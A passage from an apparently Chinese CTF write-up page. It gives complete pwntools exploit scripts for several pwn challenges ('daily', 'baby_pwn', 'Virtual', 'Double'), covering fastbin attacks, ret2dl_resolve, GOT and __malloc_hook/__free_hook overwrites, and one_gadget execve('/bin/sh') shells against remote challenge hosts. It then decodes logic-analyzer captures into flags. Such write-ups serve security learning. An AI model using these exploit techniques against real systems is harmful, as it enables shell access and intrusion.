r.sendline(str(data))</div><div class="line">        i += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span>(i % <span class="number">41</span> == <span class="number">0</span>):</div><div class="line">            r.recvuntil(<span class="string">"continue(yes/no)? \n"</span>)</div><div class="line">            r.sendline(<span class="string">"yes"</span>)</div><div class="line">            <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="comment">#ret = get(0x150) - 0x118</span></div><div class="line"><span class="comment">#print "ret: " + hex(ret)</span></div><div class="line">pie = get(<span class="number">0x158</span>) - <span class="number">0xb11</span></div><div class="line"><span class="keyword">print</span> <span class="string">"pie: "</span> + hex(pie)</div><div class="line"></div><div class="line">write(<span class="number">0x158</span>, [pie + pop_rdi_ret, pie + <span class="number">0x202020</span>, pie + <span class="number">0x8B0</span>, pie + <span class="number">0xb0c</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</div><div class="line"></div><div class="line">libc = u64(r.recvuntil(<span class="string">"\n"</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">0x06f690</span></div><div class="line"><span class="keyword">print</span> <span class="string">"libc: "</span> + hex(libc)</div><div class="line"></div><div class="line">system = libc + <span class="number">0x045390</span></div><div class="line">binsh = libc + <span class="number">0x18cd57</span></div><div class="line"></div><div class="line">write(<span class="number">0x158</span>, [pie + pop_rdi_ret, binsh, system, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<h2 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h2><p><code>remove</code>的时候没有对<code>index</code>进行范围检测.</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5am3uuj20a3062aa1.jpg" alt=""></p>
<p>先利用<code>unsorted bin</code>泄露<code>libc</code>,再利用<code>fastbin</code>单链表泄露<code>heap</code>基址.</p>
<p>申请一个<code>chunk</code>,在里面伪造一个堆指针和对应的<code>faker chunk</code>.<br><code>free</code>掉这个<code>faker chunk</code>,通过<code>edit</code>构造其<code>fd</code>到<code>bss</code>上,由于<code>length</code>可控,通过<code>remove</code>构造出一个<code>chunk</code>头部绕过检查.<br>成功<code>fastbin attack</code>,获得任意读写的能力,由于程序开了<code>Full RELRO</code>所以劫持<code>__free_hook</code>调用<code>system(binsh);</code>获得<code>flag</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#r = process("./pwn")</span></div><div class="line">ptr = <span class="number">0x602060</span></div><div class="line">r = remote(<span class="string">"85c3e0fcae5e972af313488de60e8a5a.kr-lab.com"</span>, <span class="string">"58512"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></div><div class="line">    r.sendline(str(<span class="number">1</span>))</div><div class="line">    data = r.recvuntil(<span class="string">"Your choice:"</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, content)</span>:</span></div><div class="line">    r.sendline(str(<span class="number">2</span>))</div><div class="line">    r.recvuntil(<span class="string">"of daily:"</span>)</div><div class="line">    r.sendline(str(length))</div><div class="line">    r.recvuntil(<span class="string">"daily\n"</span>)</div><div class="line">    r.send(content)</div><div class="line">    r.recvuntil(<span class="string">"Your choice:"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></div><div class="line">    r.sendline(str(<span class="number">3</span>))</div><div class="line">    r.recvuntil(<span class="string">"of daily:"</span>)</div><div class="line">    r.sendline(str(index))</div><div class="line">    r.recvuntil(<span class="string">"daily\n"</span>)</div><div class="line">    r.send(content)</div><div class="line">    r.recvuntil(<span class="string">"Your choice:"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></div><div class="line">    r.sendline(str(<span class="number">4</span>))</div><div class="line">    r.recvuntil(<span class="string">"of daily:"</span>)</div><div class="line">    r.sendline(str(index))</div><div class="line">    r.recvuntil(<span class="string">"Your choice:"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Your choice:"</span>)</div><div class="line"></div><div class="line">add(<span class="number">0x100</span>, <span class="string">'a'</span>)<span class="comment">#0</span></div><div class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>)<span class="comment">#1</span></div><div class="line">add(<span class="number">0x100</span>, <span class="string">'c'</span>)<span class="comment">#2</span></div><div class="line">add(<span class="number">0x100</span>, <span class="string">'d'</span>)<span class="comment">#3</span></div><div class="line">remove(<span class="number">0</span>)</div><div class="line">remove(<span class="number">2</span>)</div><div class="line">add(<span class="number">0x100</span>, <span class="string">'a'</span> * <span class="number">8</span>)<span class="comment">#0</span></div><div class="line">add(<span class="number">0x100</span>, <span class="string">'a'</span> * <span class="number">8</span>)<span class="comment">#2</span></div><div class="line"></div><div class="line">r.sendline(str(<span class="number">1</span>))</div><div class="line">r.recvuntil(<span class="string">"aaaaaaaa"</span>)</div><div class="line">heap = u64(r.recvuntil(<span class="string">"1 :"</span>)[:<span class="number">-3</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">0x220</span></div><div class="line">r.recvuntil(<span class="string">"aaaaaaaa"</span>)</div><div class="line">libc = u64(r.recvuntil(<span class="string">"3 :"</span>)[:<span class="number">-3</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">0x3c4b78</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"heap: "</span> + hex(heap)</div><div class="line"><span class="keyword">print</span> <span class="string">"libc: "</span> + hex(libc)</div><div class="line"></div><div class="line">remove(<span class="number">0</span>)</div><div class="line">remove(<span class="number">1</span>)</div><div class="line">remove(<span class="number">2</span>)</div><div class="line">remove(<span class="number">3</span>)</div><div class="line"></div><div class="line">add(<span class="number">0x60</span>, p64(heap + <span class="number">0x30</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>))<span class="comment">#0</span></div><div class="line">add(<span class="number">0x20</span>, <span class="string">'a'</span>)<span class="comment">#1</span></div><div class="line">add(<span class="number">0x50</span>, <span class="string">'a'</span>)<span class="comment">#2</span></div><div class="line">add(<span class="number">0x20</span>, <span class="string">'a'</span>)<span class="comment">#3</span></div><div class="line">remove((heap + <span class="number">0x18</span> - ptr - <span class="number">8</span>) / <span class="number">0x10</span>)</div><div class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x51</span>) + p64(ptr + <span class="number">0x18</span>))</div><div class="line">remove(<span class="number">1</span>)</div><div class="line">add(<span class="number">0x40</span>, <span class="string">'a'</span>)<span class="comment">#1</span></div><div class="line">add(<span class="number">0x40</span>, <span class="string">'a'</span>)<span class="comment">#4</span></div><div class="line">edit(<span class="number">4</span>, p64(ptr))</div><div class="line">edit(<span class="number">2</span>, p64(<span class="number">0x100</span>) + p64(ptr) + p64(<span class="number">0</span>) * <span class="number">4</span>)</div><div class="line">edit(<span class="number">0</span>, p64(<span class="number">0x100</span>) + p64(ptr) + p64(<span class="number">0x100</span>) + p64(libc + <span class="number">0x3c67a8</span>) + p64(<span class="number">0x100</span>) + p64(libc + <span class="number">0x18cd57</span>))</div><div class="line">edit(<span class="number">1</span>, p64(libc + 	<span class="number">0x045390</span>))</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(r)</span></div><div class="line">r.sendline(str(<span class="number">4</span>))</div><div class="line">r.recvuntil(<span class="string">"of daily:"</span>)</div><div class="line">r.sendline(str(<span class="number">2</span>))</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<h2 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h2><p><code>ret2dl in x86</code>,没有可供<code>leak</code>的函数.保护很少,想起之前的<code>0ctf2018 babystack</code>,修改脚本直接打,成功.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#r = process("./pwn")</span></div><div class="line">r = remote(<span class="string">"c346dfd9093dd09cc714320ffb41ab76.kr-lab.com"</span>, <span class="string">"56833"</span>)</div><div class="line"></div><div class="line">rop = roputils.ROP(<span class="string">'./pwn'</span>)</div><div class="line">addr_bss = rop.section(<span class="string">'.bss'</span>)</div><div class="line"></div><div class="line">buf1 = <span class="string">'A'</span> * <span class="number">0x2c</span></div><div class="line">buf1 += p32(<span class="number">0x8048390</span>) + p32(<span class="number">0x804852D</span>) + p32(<span class="number">0</span>) + p32(addr_bss) + p32(<span class="number">100</span>)</div><div class="line">r.send(buf1)</div><div class="line"></div><div class="line">buf2 =  rop.string(<span class="string">'/bin/sh'</span>)</div><div class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</div><div class="line">buf2 += rop.dl_resolve_data(addr_bss + <span class="number">20</span>, <span class="string">'system'</span>)</div><div class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</div><div class="line">r.send(buf2)</div><div class="line"></div><div class="line">buf3 = <span class="string">'A'</span> * <span class="number">0x2c</span> + rop.dl_resolve_call(addr_bss + <span class="number">20</span>, addr_bss)</div><div class="line">r.send(buf3)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(r)</span></div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<h2 id="Virtual"><a href="#Virtual" class="headerlink" title="Virtual"></a>Virtual</h2><p>感觉难度主要在于逆向,理解程序逻辑.</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5helmoj208d0b3aa8.jpg" alt=""></p>
<p>首先是<code>store_instruction</code>函数将输入通过分隔符分类为各种操作符并保存在堆中,<code>store_num</code>同理.<br>其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据).</p>
<p>重点就是<code>op</code>函数.</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5oqogij20ea055jrc.jpg" alt=""></p>
<p>这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里<code>IDA</code>反汇编有问题,没有识别出函数调用,实际上<code>i</code>会被赋值为函数调用的返回值.</p>
<p>这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先<code>push</code>.</p>
<p>关键函数是<code>load</code>和<code>save</code>,知道偏移就可以任意读写.<br>先使用<code>load</code>泄露堆上的堆地址,由于没开<code>pie</code>,通过<code>-</code>和<code>/</code>求出<code>.got[puts]</code>和此处偏移,再次<code>load</code>泄露<code>libc</code>,处理与<code>system</code>的偏移获得<code>system</code>地址.<br>不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得<code>.got[puts]</code>偏移,调用<code>save</code>成功劫持<code>puts@plt</code>.<br>突然发现<code>username</code>作用,开始试了<code>/bin/sh</code>,<code>ls</code>,<code>cat flag</code>什么的都是<code>comment not found</code>,最后<code>/bin/bash</code>成功.(话说这是故意的还是什么鬼)</p>
<p><code>payload</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#context.log_level = 'debug'</span></div><div class="line"><span class="comment">#r = process("./pwn")</span></div><div class="line">r = remote(<span class="string">"a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com"</span>, <span class="string">"40003"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Your program name:\n"</span>)</div><div class="line">r.sendline(<span class="string">"/bin/bash"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Your instruction:\n"</span>)</div><div class="line">payload = <span class="string">"push push push load push sub div sub load push add"</span></div><div class="line">payload += <span class="string">" push push push load push sub div sub save"</span></div><div class="line"><span class="comment">#payload = "push push push load push sub div sub load pop"</span></div><div class="line">r.sendline(payload)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(r)</span></div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Your stack data:\n"</span>)</div><div class="line"><span class="comment">#payload = "-1 8 -5 4210720"</span></div><div class="line">payload = <span class="string">"-1 8 -5 4210720 -172800 -1 8 -6 4210720"</span></div><div class="line"><span class="comment">#0x404020 = 4210720,offset = -172800,one_gadget = -173178</span></div><div class="line">r.sendline(payload)</div><div class="line"></div><div class="line"><span class="comment">#print r.recv()</span></div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<h2 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h2><p>新增node时 ，会出现重用指针的情况， 导致后面的 uaf</p>
<p><img src="https://i.loli.net/2019/04/21/5cbbfe4598cd4.png" alt=""></p>
<p>然后 fastbin 改 malloc_hook</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"></div><div class="line">path = <span class="string">"/home/hac425/vm_data/pwn/gs/Double/pwn"</span></div><div class="line">aslr = <span class="keyword">True</span></div><div class="line">context.log_level = <span class="keyword">True</span></div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</div><div class="line"></div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</div><div class="line"></div><div class="line">p = process(path, aslr=aslr)</div><div class="line"></div><div class="line">p = remote(<span class="string">"e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com"</span>, <span class="number">40002</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(data)</span>:</span></div><div class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</div><div class="line">    p.sendafter(<span class="string">"Your data:"</span>, data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></div><div class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"2"</span>)</div><div class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></div><div class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"3"</span>)</div><div class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</div><div class="line">    sleep(<span class="number">0.1</span>)</div><div class="line">    p.send(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></div><div class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"4"</span>)</div><div class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</div><div class="line"></div><div class="line"></div><div class="line">new(<span class="string">"0"</span> * (<span class="number">0x80</span> - <span class="number">1</span>) + <span class="string">"\n"</span>)  <span class="comment"># 0</span></div><div class="line">new(<span class="string">"1"</span> * (<span class="number">0x90</span> - <span class="number">1</span>) + <span class="string">"\n"</span>)  <span class="comment"># 1</span></div><div class="line">new(<span class="string">"1"</span> * (<span class="number">0x90</span> - <span class="number">1</span>) + <span class="string">"\n"</span>)  <span class="comment"># 2</span></div><div class="line">new(<span class="string">"2"</span> * (<span class="number">0x80</span> - <span class="number">1</span>) + <span class="string">"\n"</span>)  <span class="comment"># 3</span></div><div class="line"></div><div class="line">delete(<span class="number">1</span>)</div><div class="line">show(<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></div><div class="line"><span class="string">constraints:</span></div><div class="line"><span class="string">  rax == NULL</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></div><div class="line"><span class="string">constraints:</span></div><div class="line"><span class="string">  [rsp+0x30] == NULL</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></div><div class="line"><span class="string">constraints:</span></div><div class="line"><span class="string">  [rsp+0x50] == NULL</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></div><div class="line"><span class="string">constraints:</span></div><div class="line"><span class="string">  [rsp+0x70] == NULL</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line">libc.address = u64(p.recv(<span class="number">6</span>) + <span class="string">"\x00"</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x68</span></div><div class="line">onegadget = libc.address + <span class="number">0xf1147</span></div><div class="line">info(<span class="string">"libc: &#123;&#125;"</span>.format(hex(libc.address)))</div><div class="line"></div><div class="line">new(<span class="string">"4"</span> * (<span class="number">0x60</span> - <span class="number">1</span>) + <span class="string">"\n"</span>)  <span class="comment"># 4 , 2 ---&gt; 4</span></div><div class="line">new(<span class="string">"5"</span> * (<span class="number">0x60</span> - <span class="number">1</span>) + <span class="string">"\n"</span>)  <span class="comment"># 5</span></div><div class="line"></div><div class="line">delete(<span class="number">4</span>)</div><div class="line"></div><div class="line">edit(<span class="number">2</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span>) + <span class="string">"\n"</span>)</div><div class="line"></div><div class="line">new(<span class="string">"6"</span> * (<span class="number">0x60</span> - <span class="number">1</span>) + <span class="string">"\n"</span>)  <span class="comment"># 6</span></div><div class="line"></div><div class="line">new(<span class="string">"\x00"</span> * (<span class="number">0x60</span> - <span class="number">1</span>) + <span class="string">"\n"</span>)  <span class="comment"># 7</span></div><div class="line"></div><div class="line">payload = <span class="string">"\x00"</span> * <span class="number">0x13</span></div><div class="line">payload += p64(onegadget)</div><div class="line">payload += p64(onegadget)</div><div class="line">payload += p64(onegadget)</div><div class="line">payload += <span class="string">"\n"</span></div><div class="line">edit(<span class="number">7</span>, payload)</div><div class="line"></div><div class="line">p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>三人出境即可</p>
<h2 id="saleae"><a href="#saleae" class="headerlink" title="saleae"></a>saleae</h2><p>通过提示找到 saleae 这个软件，将数据导入，选择 SPI 协议进行分析，可以得到 flag。</p>
<p>导出的分析报告如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">Time [s],Packet ID,MOSI,MISO</div><div class="line">0.378724400000000,,f,&apos;0&apos;</div><div class="line">0.378730100000000,,l,&apos;0&apos;</div><div class="line">0.378735800000000,,a,&apos;0&apos;</div><div class="line">0.378741500000000,,g,&apos;0&apos;</div><div class="line">0.378747300000000,,&#123;,&apos;0&apos;</div><div class="line">0.378753000000000,,1,&apos;0&apos;</div><div class="line">0.378758700000000,,2,&apos;0&apos;</div><div class="line">0.378764500000000,,0,&apos;0&apos;</div><div class="line">0.378770200000000,,7,&apos;0&apos;</div><div class="line">0.378775900000000,,1,&apos;0&apos;</div><div class="line">0.378781700000000,,3,&apos;0&apos;</div><div class="line">0.378787400000000,,9,&apos;0&apos;</div><div class="line">0.378793100000000,,7,&apos;0&apos;</div><div class="line">0.378798900000000,,-,&apos;0&apos;</div><div class="line">0.378804600000000,,1,&apos;0&apos;</div><div class="line">0.378810300000000,,9,&apos;0&apos;</div><div class="line">0.378816100000000,,d,&apos;0&apos;</div><div class="line">0.378821800000000,,1,&apos;0&apos;</div><div class="line">0.378827500000000,,-,&apos;0&apos;</div><div class="line">0.378833300000000,,4,&apos;0&apos;</div><div class="line">0.378839000000000,,8,&apos;0&apos;</div><div class="line">0.378844700000000,,e,&apos;0&apos;</div><div class="line">0.378850400000000,,6,&apos;0&apos;</div><div class="line">0.378856200000000,,-,&apos;0&apos;</div><div class="line">0.378861900000000,,b,&apos;0&apos;</div><div class="line">0.378867600000000,,e,&apos;0&apos;</div><div class="line">0.378873400000000,,8,&apos;0&apos;</div><div class="line">0.378879100000000,,c,&apos;0&apos;</div><div class="line">0.378884800000000,,-,&apos;0&apos;</div><div class="line">0.378890500000000,,7,&apos;0&apos;</div><div class="line">0.378896300000000,,8,&apos;0&apos;</div><div class="line">0.378902000000000,,4,&apos;0&apos;</div><div class="line">0.378907700000000,,b,&apos;0&apos;</div><div class="line">0.378913500000000,,8,&apos;0&apos;</div><div class="line">0.378919200000000,,9,&apos;0&apos;</div><div class="line">0.378924900000000,,a,&apos;0&apos;</div><div class="line">0.378930700000000,,9,&apos;0&apos;</div><div class="line">0.378936400000000,,5,&apos;0&apos;</div><div class="line">0.378942100000000,,e,&apos;0&apos;</div><div class="line">0.378947900000000,,0,&apos;0&apos;</div><div class="line">0.378953600000000,,7,&apos;0&apos;</div><div class="line">0.378959300000000,,&#125;,&apos;0&apos;</div></pre></td></tr></table></figure>
<p>即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;12071397-19d1-48e6-be8c-784b89a95e07&#125;</div></pre></td></tr></table></figure>
<h2 id="24c"><a href="#24c" class="headerlink" title="24c"></a>24c</h2><p>和上一道题类似，导出的数据报告如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">Time [s], Analyzer Name, Decoded Protocol Result</div><div class="line">0.843705500000000,I2C,Setup Write to [&apos;160&apos;] + ACK</div><div class="line">0.843872000000000,I2C,&apos; &apos; + ACK</div><div class="line">0.844038500000000,I2C,f + ACK</div><div class="line">0.844205000000000,I2C,1 + ACK</div><div class="line">0.844371000000000,I2C,6 + ACK</div><div class="line">0.844537500000000,I2C,3 + ACK</div><div class="line">0.844704000000000,I2C,b + ACK</div><div class="line">0.844870500000000,I2C,d + ACK</div><div class="line">0.845036500000000,I2C,f + ACK</div><div class="line">0.845203000000000,I2C,4 + ACK</div><div class="line">0.845369500000000,I2C,e + ACK</div><div class="line">0.845536000000000,I2C,&#125; + ACK</div><div class="line">0.845702500000000,I2C,&apos;0&apos; + ACK</div><div class="line">0.945796000000000,I2C,Setup Write to [&apos;160&apos;] + ACK</div><div class="line">0.945962500000000,I2C,&apos;0&apos; + ACK</div><div class="line">0.946154000000000,I2C,Setup Read to [&apos;161&apos;] + ACK</div><div class="line">0.946318000000000,I2C,f + ACK</div><div class="line">0.946481500000000,I2C,l + ACK</div><div class="line">0.946645000000000,I2C,a + ACK</div><div class="line">0.946808500000000,I2C,g + ACK</div><div class="line">0.946972000000000,I2C,&#123; + ACK</div><div class="line">0.947135500000000,I2C,c + ACK</div><div class="line">0.947299500000000,I2C,4 + ACK</div><div class="line">0.947463000000000,I2C,6 + ACK</div><div class="line">0.947626500000000,I2C,d + ACK</div><div class="line">0.947790000000000,I2C,9 + ACK</div><div class="line">0.947953500000000,I2C,e + ACK</div><div class="line">0.948117500000000,I2C,1 + ACK</div><div class="line">0.948281000000000,I2C,0 + ACK</div><div 